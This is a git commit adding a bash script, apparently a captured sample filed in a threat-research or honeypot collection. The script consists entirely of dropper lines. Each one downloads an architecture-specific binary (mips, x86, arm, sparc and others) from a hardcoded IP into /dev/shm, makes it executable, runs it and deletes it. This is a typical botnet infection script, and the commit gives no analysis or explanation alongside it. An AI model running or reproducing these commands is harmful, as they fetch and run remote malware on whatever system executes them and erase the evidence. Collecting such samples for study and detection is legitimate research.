2de8c31c97c04985d7acdac91dde997ff4dbcd16
siqlab <sangay@vairav.net>
2023-10-12 01:19:46 -0700

    Added B03 for T02 and T03 - Oct-12-2023

---
+++ T02-B03-AR-Oct-12-2023/BASE-T01-B03-I01-AR-VM1-P21-.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+cd /dev/shm; wget http://64.79.79.178/mips; chmod +x mips; ./mips; rm -rf mips
+cd /dev/shm; wget http://64.79.79.178/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+cd /dev/shm; wget http://64.79.79.178/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+cd /dev/shm; wget http://64.79.79.178/x86; chmod +x x86; ./x86; rm -rf x86
+cd /dev/shm; wget http://64.79.79.178/armv6l; chmod +x armv6l; ./armv6l; rm -rf armv6l
+cd /dev/shm; wget http://64.79.79.178/i686; chmod +x i686; ./i686; rm -rf i686
+cd /dev/shm; wget http://64.79.79.178/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
+cd /dev/shm; wget http://64.79.79.178/i586; chmod +x i586; ./i586; rm -rf i586
+cd /dev/shm; wget http://64.79.79.178/m68k; chmod +x m68k; ./m68k; rm -rf m68k
+cd /dev/shm; wget http://64.79.79.178/sparc; chmod +x sparc; ./sparc; rm -rf sparc
+cd /dev/shm; wget http://64.79.79.178/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l
+cd /dev/shm; wget http://64.79.79.178/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l
